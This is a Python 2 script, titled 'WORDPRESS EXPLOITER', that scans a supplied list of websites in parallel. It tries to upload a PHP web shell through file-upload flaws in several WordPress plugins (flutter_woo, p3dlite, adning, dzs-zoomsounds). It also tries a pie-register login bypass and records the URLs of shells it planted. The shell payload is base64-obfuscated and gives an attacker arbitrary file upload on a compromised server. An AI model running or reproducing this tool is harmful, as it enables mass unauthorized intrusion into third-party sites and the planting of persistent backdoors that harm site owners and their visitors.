import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print e
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()


if os.path.isfile('wp-.php'):
   pass
else:
 localfiles = "<?php\r\nerror_reporting(0);\r\necho(base64_decode(\"T3ZlcnRoaW5rZXIxODc3Ijxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnbmFtZT0nZicgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI=\"));\r\n@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);\r\necho(\"<a href=\".$_FILES['f']['name'].\">\".$_FILES['f']['name'].\"</a>\");\r\n?>"
 sh = open("wp-.php", "a")
 sh.write(localfiles)
 sh.close()

def vuln_check4(uri):
	headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
	response = requests.get(uri,headers=headers, timeout=5, verify=False, allow_redirects=False)
	raw = response.text
	if ("Key must be" in raw):
		return True;
	else:
		return False;
def wp_ms(url):
 
 try:
  headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
  uri = url+'/wp-json/api/flutter_woo/config_file'
  check = vuln_check4(uri);
  if (check == False):
    return False
  else:
      files = {'file' : ( "config.json.php", open("wp-.php"), "application/json" )}
      response = requests.post(uri, files=files )
      sa = open("wp_ms.txt", "a")
      sa.write(url+":"+response.text)
      sa.close()
 except:
   pass
def wp_dwnld(url):
 try:
		headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
		get_sole = requests.get(url,headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "pie-register" in get_sole or "pie_notice_" in get_sole:
		    coy = requests.session()
		    payload = {'user_id_social_site': '1','social_site': 'true','_wp_http_referer':'/login/','log': 'null','pwd':'null'}
		    cok = coy.post(url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=8)
		    #print(cok)
		    if cok.status_code == 302:
		        se = open('pie-register.txt', 'a')
		        se.write(url+'\n')
		        se.close()
		        return True
		    else:
		        return False
		else:
		 return False
 except:
		return False

def vuln_check2(uri):
	headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
	response = requests.get(uri,headers=headers, timeout=5, verify=False, allow_redirects=False)
	raw = response.text
	if ("jsonrpc" in raw):
		return True
	else:
		return False
def wp_p3d(url):
  try:
   headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
   uri = url+"/wp-admin/admin-ajax.php?action=p3dlite_handle_upload"
   check = vuln_check2(uri)
   if(check == False):
    return False
   else:
    files = {'file' : open("wp-.php")}
    response = requests.post(uri, files=files,headers=headers, timeout=5, verify=False, allow_redirects=False)
    if("wp-.php" in response.text):
     path_shell = url+"/wp-content/uploads/p3d/wp-.php"
     cok = open("Shells.txt", "a")
     cok.write(path_shell+"\n")
     cok.close()
     return True
    else:
        return False
  except:
    return False
def vuln_check3(uri):
 try:
     headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
     response = requests.get(uri,headers=headers, timeout=5, verify=False, allow_redirects=False)
     raw = response.text
     if ("no files found" in raw):
         return True
     else:
         return False
 except:
  return False

def wp_adning(url):
 try:
  headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
  uri = url + '/wp-admin/admin-ajax.php?action=_ning_upload_image'  	
  check = vuln_check3(uri);
  if(check == False):
      return False
  else:
      files = {'files[]' : open("wp-.php")}
      data = {"allowed_file_types" : "php,jpg,jpeg","upload" : json.dumps({"dir" : "../"})}
      response = requests.post(uri, files=files, data=data,headers=headers, timeout=5, verify=False, allow_redirects=False)
      if("wp-.php" in response.text):
          path_shell = url+"/wp-.php"
          cok = open("Shells.txt", "a")
          cok.write(path_shell+"\n")
          cok.close()
          return True
      else:
          return False
 except:
  return False
def wp_dz(url):
 head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
 try :
  x = requests.session()
  listaa = url+'/wp-content/plugins/dzs-zoomsounds/savepng.php?location=1877.php'
  req_first = x.get(url, headers=head,timeout=5,verify=False, allow_redirects=False)
  if "error:http raw post data does not exist" in req_first.text:
      burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close"}
      burp0_data = "<?php\r\nerror_reporting(0);\r\necho(base64_decode(\"T3ZlcnRoaW5rZXIxODc3Ijxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnbmFtZT0nZicgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI=\"));\r\n@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);\r\necho(\"<a href=\".$_FILES['f']['name'].\">\".$_FILES['f']['name'].\"</a>\");\r\n?>"
      rw = requests.post(url, headers=burp0_headers, data=burp0_data,timeout=5, verify=False, allow_redirects=False)
      if rw:
         urlx = (url+"/wp-content/plugins/dzs-zoomsounds/1877.php")
         req_second = x.get(urlx, headers=head,timeout=5, verify=False, allow_redirects=False)
         if "Overthinker1877" in req_second.text:
             cok = open("Shells.txt", "a")
             cok.write(urlx+"\n")
             cok.close()
             return True
         else:
             return False
 except:
     return False


def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),
def main(ul):
 if "://" in ul:
      ul = ul
 else:
      ul = "http://" + ul
 try:
   text = '\033[32;1m#\033[0m '+url
   wp1 = wp_dwnld(url)
   wp2 = wp_p3d(url)
   wp3 = wp_adning(url)
   wp4 = wp_dz(url)
   wp5 = wp_ms(url)
   
   if wp4:
    text += ' | \033[32;1mWP_DZ\033[0m'
   else:
     text += ' | \033[31;1mWP_DZ\033[0m'
   if wp3:
    text += ' | \033[32;1mWP_ADNING\033[0m'
   else:
     text += ' | \033[31;1mWP_ADNING\033[0m'
   if wp1:
    text += ' | \033[32;1mWP_PIE\033[0m'
   else:
     text += ' | \033[31;1mWP_PIE\033[0m'
   if wp2:
     text += ' | \033[32;1mWP_P3D\033[0m'
   else:
    text += ' | \033[31;1mWP_P3D\033[0m'
   if wp5:
     text += ' | \033[32;1mWP_MS\033[0m'
   else:
    text += ' | \033[31;1mWP_MS\033[0m'
 except Exception as er:
  #text = '\033[31;1m#\033[0m '+url
  #text += ' | \033[31;1mCan\'t access sites\033[0m'
  print(er)
 printf(text)


if __name__ == '__main__':
    print('''
    WORDPRESS EXPLOITER
     \n''')
    try:
        pid_restore = ".pid_restore"
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
        tanya = raw_input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = raw_input("websitelist ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("threads? : ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    
    for url in readsplit:
        
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass


